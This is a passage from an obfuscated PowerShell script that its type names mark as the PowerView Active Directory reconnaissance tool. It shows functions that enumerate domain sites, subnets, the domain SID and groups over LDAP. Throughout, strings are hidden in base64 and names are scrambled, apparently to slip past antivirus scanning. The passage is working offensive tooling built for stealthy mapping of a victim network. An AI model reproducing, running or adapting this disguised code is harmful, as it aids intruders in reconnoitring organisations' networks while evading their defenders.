        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/\/===\/\_/\__} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if (${_/\/\/===\/\_/\__}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnACAAZgByAG8AbQAgACcAJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACcA')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${_/\/\/===\/\_/\__} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${_/\/\/===\/\_/\__}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcA')))
                        }
                    }
                }
                else {
                    try {
                        ${_/==\/\_/==\_/\/=} = (-Join (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                    }
                    catch {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkA')))
                    }
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABzAGkAdABlAHMAIAB3AGkAdABoACAAJAB7AF8AXwAvAFwAXwAvAFwAXwAvAFwALwA9AFwALwBcAC8APQBcAH0AIABzAGUAdAAgAGkAbgAgAHQAaABlACAAZwBwAEwAaQBuAGsAIABwAHIAbwBwAGUAcgB0AHkA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AF8AXwAvAFwAXwAvAFwAXwAvAFwALwA9AFwALwBcAC8APQBcAH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${_/\/\/===\/\_/\__}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACQARgBpAGwAdABlAHIAKQA=')))
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $(${_/\/\/===\/\_/\__}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${_/\/\/===\/\_/\__}.FindAll() }
            else { ${/==\_/=\____/===\} = ${_/\/\/===\/\_/\__}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${/===\_/\/\/===\__} = $_
                }
                else {
                    ${/===\_/\/\/===\__} = ____/=\__/\/=\__/= -Properties $_.Properties
                }
                ${/===\_/\/\/===\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                ${/===\_/\/\/===\__}
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQA')))
                }
            }
            ${_/\/\/===\/\_/\__}.dispose()
        }
    }
}
function Get-DomainSubnet {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/\_/\/=\__/=\_} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if (${_/\/\_/\/=\__/=\_}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwAgAGYAcgBvAG0AIAAnACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQAnAA==')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${_/\/\_/\/=\__/=\_} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${_/\/\_/\/=\__/=\_}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnAA==')))
                        }
                    }
                }
                else {
                    try {
                        ${_/==\/\_/==\_/\/=} = (-Join (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                    }
                    catch {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkA')))
                    }
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${_/\/\_/\/=\__/=\_}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $(${_/\/\_/\/=\__/=\_}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${_/\/\_/\/=\__/=\_}.FindOne() }
            else { ${/==\_/=\____/===\} = ${_/\/\_/\/=\__/=\_}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${_/\/=\_/====\/=\/} = $_
                }
                else {
                    ${_/\/=\_/====\/=\/} = ____/=\__/\/=\__/= -Properties $_.Properties
                }
                ${_/\/=\_/====\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                    if (${_/\/=\_/====\/=\/}.properties -and (${_/\/=\_/====\/=\/}.properties.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA=='))))) {
                        ${_/\/=\_/====\/=\/}
                    }
                    elseif (${_/\/=\_/====\/=\/}.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA==')))) {
                        ${_/\/=\_/====\/=\/}
                    }
                }
                else {
                    ${_/\/=\_/====\/=\/}
                }
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${_/\/\_/\/=\__/=\_}.dispose()
        }
    }
}
function ___/\/=\/=\_/==\/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${/=\___/=\__/=\/\/} = @{
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${__/=\/\_/\_/==\_/} = _/==\/\/\_______/\ @/=\___/=\__/=\/\/ -FindOne | select -First 1 -ExpandProperty objectsid
    if (${__/=\/\_/\_/==\_/}) {
        ${__/=\/\_/\_/==\_/}.SubString(0, ${__/=\/\_/\_/==\_/}.LastIndexOf('-'))
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMASQBEAF0AIABFAHIAcgBvAHIAIABlAHgAdAByAGEAYwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABTAEkARAAgAGYAbwByACAAJwAkAEQAbwBtAGEAaQBuACcA')))
    }
}
function ___/\/=========\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${____/=\_/\/\_/\___},
        [Switch]
        ${_/==\/\_/\/==\_/=\},
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${___/===\/\_/\/=\__},
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${_/===\_/\/\/====\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
